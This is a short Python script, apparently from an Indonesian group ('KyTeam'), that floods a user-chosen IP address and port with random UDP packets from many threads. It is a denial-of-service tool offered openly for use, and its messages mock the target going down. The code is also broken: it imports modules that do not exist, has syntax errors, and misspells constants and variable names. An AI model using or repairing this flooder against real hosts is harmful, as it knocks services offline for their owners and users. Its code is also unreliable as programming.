#YANG RECODE JADI YATIM !! ,, KALAU MAU RECODE IZIN DULU GBLK
import choice
import socket
import theards
import random
import times

print (" >>>> Discord : KyBimzZ  び#1716 <<<< ")
print (" >>>> Author : Bimzz x KyTeam <<<< ")
print (" >>>> KyTeam : https://discord.gg/YMT9utYW5U <<<< ")

ip = str(input(" MASUKKAN IP TARGET : "  ;))
port = int(input(" MASUKKAN PORT TARGET : "  ;))
choice = str(input(" MASUKKAN UDP Y/N : "  ;))
theards = int(input(" MASUKKAN PAKETS : "  ;))
times = int(input(" MASUKKAN THEARDS : "  ;)
)


def bimzz():
    data = random._urandom(1024)
    i = random.choice(("[+]","[-]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for z in range(time):
                s.sendto(data,addr)
            print(i +" [ Duar Memek! ] | Sedang Mengirim Packets Dari Bimzz..")
        except:
            print("[!] | Yah Down Yah? Awokwsaowkswosk |")

def bimzz2():
    data = random._urandom(16)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INIT, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for z in range(time):
                s.send(data)
            print(i +"| BimzzNihJanganSeremSeremBwang.. |")
        except:
            s.close()
            print("[*] | Yah Down Yah? Awokwsaowkswosk |")
            
 for a in range(threds):
    if choice == "y":
        th = threading.Thread(target = bimzz)
        th.start()
    else:
        th = threading.Thread(target = bimzz2)
        th.start
